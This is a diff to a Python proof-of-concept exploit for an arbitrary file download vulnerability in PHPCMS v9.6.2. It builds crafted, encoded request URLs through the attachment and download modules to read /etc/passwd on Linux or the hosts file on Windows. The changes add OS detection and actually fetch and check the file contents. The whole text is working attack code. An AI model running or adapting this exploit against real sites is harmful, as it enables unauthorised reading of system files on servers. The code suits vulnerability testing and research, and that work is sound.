@@ -8,17 +8,30 @@ import sys
 import requests
 from termcolor import cprint
 
+def get_os(target):
+    """ 通过简单URL大小写判断是Win or Linux """
+    r = requests.get(target + 'Index.php')
+    if r.status_code == 200:
+        return 'WINDOWS'
+    else:
+        return 'LINUX'
+
 def poc(target):
-    print('第一次请求，获取 cookie_siteid ')
+    print('[*] first req, get os type to set different download-file url')
+    os = get_os(target)
+    print('[*] second req, get cookie_siteid param')
     url = target +'index.php?m=wap&c=index&a=init&siteid=1'
     s = requests.Session()
     r = s.get(url)
     cookie_siteid =  r.headers['set-cookie']
     cookie_siteid = cookie_siteid[cookie_siteid.index('=')+1:]
     # print cookie_siteid
-    print('第二次请求，获取 att_json ')
+    print('[*] third req, get att_json param')
     # 目标文件 /etc/passwd
-    url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D/etc/passw%26f%3Dd%3%25252%2*70C'
+    if os == 'WINDOWS':
+        url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dc:Windows/System32/drivers/etc/host%26f%3Ds%3%25252%2*70C'
+    else:
+        url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D/etc/passw%26f%3Dd%3%25252%2*70C'        
     post_data = {
         'userid_flash':cookie_siteid
     }
@@ -28,15 +41,29 @@ def poc(target):
         if '_att_json' in cookie.name:
             cookie_att_json = cookie.value
     # print cookie_att_json
-    print('第三次请求，获取 文件下载链接 ')
+    print('[*] fourth req, get download url')
     url = target + 'index.php?m=content&c=down&a=init&a_k=' + cookie_att_json
     r = s.get(url)
     # print r.text
     if 'm=content&c=down&a=download&a_k=' in r.text:
-        cprint('[!] Vul : {}'.format(target),'red')
-        return True
-    else:
-        return False
+        start = r.text.index('download&a_k=')
+        end = r.text.index('" class="xzs')
+        # print('-- start: {}  end: {}'.format(start,end))
+        download_url = r.text[start+13:end]
+        download_url = target + 'index.php?m=content&c=down&a=download&a_k=' + download_url
+        # print('-- download_url:{}'.format(download_url))
+        r = s.get(download_url)
+        # print r.text
+
+        if os == 'WINDOWS': # windows hosts file
+            if 'HOSTS file' in r.text:
+                cprint('[!] Vul : {}'.format(target),'red')
+                return True
+        else:
+            if 'root:x:0:0' in r.text:
+                cprint('[!] Vul : {}'.format(target),'red')
+                return True
+
 if __name__ == "__main__":
 
-    poc('http://vulhost.com/CMS/PHPCMS_v9.6.2/')
+    poc('http://localhost/PHPCMS/PHPCMS_v9.6.2/')
